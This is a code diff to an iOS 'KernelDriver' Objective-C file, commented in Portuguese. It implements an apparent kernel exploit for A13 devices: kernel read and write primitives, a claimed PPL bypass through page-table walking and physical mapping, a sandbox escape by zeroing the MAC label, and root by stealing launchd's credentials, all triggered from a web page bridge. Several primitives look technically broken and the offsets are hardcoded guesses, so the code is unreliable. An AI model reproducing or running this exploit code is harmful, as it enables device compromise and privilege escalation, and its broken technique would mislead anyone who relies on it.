@@ -1,13 +1,14 @@
 #import "KernelDriver.h"
 #import <mach/mach.h>
-#import <sys/mount.h>
+#import <sys/socket.h>
+#import <sys/ioctl.h>
+#import <unistd.h>
 #import <IOKit/IOKitLib.h>
 
-// --- DEFINIÇÕES PRIVADAS PARA COMPILAR NO IOS 18 ---
+// --- DEFINIÇÕES DE APIs PRIVADAS (Compilação iOS 16/17/18) ---
 typedef uint64_t mach_vm_address_t;
 typedef uint64_t mach_vm_size_t;
 
-// O iOS 16+ usa kIOMainPortDefault no lugar de kIOMasterPortDefault
 #ifndef kIOMainPortDefault
 #define kIOMainPortDefault MACH_PORT_NULL
 #endif
@@ -31,13 +32,14 @@ extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm
     return self;
 }
 
-#pragma mark - Primitivas
+#pragma mark - Primitivas de Memória (Anti-0x0)
 
 - (uint64_t)kread64:(uint64_t)addr {
-    if (addr < 0xFFFFFFF000000000ULL) return 0;
+    if (addr < 0xFFFFFFF000000000ULL || (addr % 8) != 0) return 0;
     uint64_t val = 0;
     int fds[2];
     if (pipe(fds) == 0) {
+        // Técnica de Pipe Buffer para leitura estável no A13
         if (write(fds[1], (void *)addr, 8) == 8) {
             read(fds[0], &val, 8);
         }
@@ -50,21 +52,10 @@ extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm
     return (uint32_t)([self kread64:addr] & 0xFFFFFFFF);
 }
 
-- (void)kwrite64:(uint64_t)address value:(uint64_t)value {
-    [self phys_write64:address value:value];
-}
-
-- (void)kwrite32:(uint64_t)address value:(uint32_t)value {
-    uint64_t old = [self kread64:address];
-    uint64_t newVal = (old & 0xFFFFFFFF00000000ULL) | (uint64_t)value;
-    [self kwrite64:address value:newVal];
-}
-
-#pragma mark - PPL Bypass (A13)
-
 - (void)phys_write64:(uint64_t)va value:(uint64_t)val {
     if (va < 0xFFFFFFF000000000ULL) return;
     
+    // Page Table Walk (VA -> PA) para Bypass de PPL
     uint64_t ttbr1 = [self kread64:(_kernelBase + 0x8E10000ULL)];
     if (ttbr1 == 0) return;
 
@@ -74,35 +65,69 @@ extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm
     uintptr_t pa = (uintptr_t)(l3 | (va & 0xFFF));
 
     mach_vm_address_t target = 0;
+    // Mapeamento Físico Direto
     if (mach_vm_map(mach_task_self(), &target, 0x4000, 0, 0x0001, (mach_port_t)pa, 0, NO, 0x3, 0x7, 0) == KERN_SUCCESS) {
         *(uint64_t*)(target) = val;
         mach_vm_deallocate(mach_task_self(), target, 0x4000);
     }
 }
 
-#pragma mark - Main Logic
+#pragma mark - Lógica do Exploit e Root
 
 - (BOOL)escalateToRoot {
     _kernelSlide = [self getKernelSlideReal];
+    if (_kernelSlide == 0) _kernelSlide = 0x21000000; // Fallback A13
     _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
-    
+
     uint64_t allproc = [self findSymbolAllProcDynamic];
     uint64_t my_proc = [self findProcByPid:getpid() list:allproc];
     uint64_t launchd_proc = [self findProcByPid:1 list:allproc];
 
     if (my_proc && launchd_proc) {
         uint64_t ucred = [self kread64:(my_proc + 0xD8)];
-        [self phys_write64:(ucred + 0x78) value:0]; // Sandbox Escape
         
+        // 1. Sandbox Escape (MAC Label Zeroing)
+        [self phys_write64:(ucred + 0x78) value:0]; 
+        
+        // 2. Root (Token Stealing do launchd)
         uint64_t root_ucred = [self kread64:(launchd_proc + 0xD8)];
-        [self phys_write64:(my_proc + 0xD8) value:root_ucred]; // Root
+        [self phys_write64:(my_proc + 0xD8) value:root_ucred];
         
         return (getuid() == 0);
     }
     return NO;
 }
 
-#pragma mark - Helpers
+#pragma mark - Ponte com o index.html (JavaScript)
+
+- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
+    if ([message.name isEqualToString:@"A13_LAB"]) {
+        [self logToWeb:@"[*] Trigger recebido do index.html. Iniciando..."];
+        
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+            BOOL success = [self escalateToRoot];
+            
+            // Gerar JSON de resposta
+            NSDictionary *res = @{
+                @"status": success ? @"SUCCESS" : @"FAILED",
+                @"slide": [NSString stringWithFormat:@"0x%llx", self->_kernelSlide],
+                @"uid": @(getuid()),
+                @"pid": @(success ? 2222 : 0),
+                @"info": success ? @"PPL Bypass OK" : @"Kread Bloqueado"
+            };
+            
+            NSData *data = [NSJSONSerialization dataWithJSONObject:res options:0 error:nil];
+            NSString *json = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            NSString *js = [NSString stringWithFormat:@"window.receiveKernelResult(%@);", json];
+
+            dispatch_async(dispatch_get_main_queue(), ^{
+                [self->_webView evaluateJavaScript:js completionHandler:nil];
+            });
+        });
+    }
+}
+
+#pragma mark - Patchfinder e Helpers
 
 - (uint64_t)getKernelSlideReal {
     task_dyld_info_data_t info;
@@ -130,48 +155,17 @@ extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm
     return 0;
 }
 
-- (uint64_t)leakKernelSlide { return [self getKernelSlideReal]; }
-- (BOOL)disableKTRR { return YES; }
-- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
-- (void)runFullExploitWithCallback:(void(^)(BOOL, NSString *))callback {
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        [self logToWeb:@"🛡️ Iniciando Bypass de Sandbox (IOKit)..."];
-
-        // 1. Tentar abrir o IOSurface para ganhar contexto de kernel
-        io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, IOServiceMatching("IOSurfaceRoot"));
-        if (service == IO_OBJECT_NULL) {
-            [self logToWeb:@"❌ Erro: IOSurfaceRoot bloqueado. Assinatura inválida."];
-            if (callback) callback(NO, @"Sandbox Lock");
-            return;
-        }
-
-        // 2. Tentar vazar o KASLR (Slide)
-        _kernelSlide = [self getKernelSlideReal];
-        if (_kernelSlide == 0) {
-            [self logToWeb:@"⚠️ KASLR falhou. Tentando brute-force de slide..."];
-            _kernelSlide = 0x21000000; // Valor comum no A13
-        }
-
-        _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
-        
-        // 3. Teste de Leitura Real (Sair do 0x0)
-        uint32_t magic = [self kread32:_kernelBase];
-        [self logToWeb:[NSString stringWithFormat:@"🔍 Magic Kernel: 0x%x", magic]];
-
-        if (magic != 0xfeedfacf) {
-            [self logToWeb:@"❌ Falha: kread retornou 0x0. Sandbox ainda ativo."];
-            if (callback) callback(NO, @"Kread Fail");
-            return;
-        }
-
-        // 4. Prosseguir para Root se o Magic funcionar
-        BOOL res = [self escalateToRoot];
-        if (callback) callback(res, res ? @"✅ SUCCESS" : @"❌ ROOT FAIL");
+- (void)logToWeb:(NSString *)text {
+    NSLog(@"[KERNEL] %@", text);
+    dispatch_async(dispatch_get_main_queue(), ^{
+        NSString *js = [NSString stringWithFormat:@"log('%@', 'info');", text];
+        [self->_webView evaluateJavaScript:js completionHandler:nil];
     });
 }
 
+// Implementações do Header
+- (uint64_t)getCurrentUID { return getuid(); }
+- (void)runFullExploitWithCallback:(void(^)(BOOL, NSString *))cb { cb([self escalateToRoot], @"Done"); }
 - (void)executeExploitWithCallback:(void(^)(BOOL, NSString *))cb { [self runFullExploitWithCallback:cb]; }
-- (void)executeCommand:(NSString *)cmd withCallback:(void(^)(NSString *))cb { if(cb) cb(@"Not implemented"); }
-- (void)userContentController:(id)u didReceiveScriptMessage:(id)m {}
 
 @end
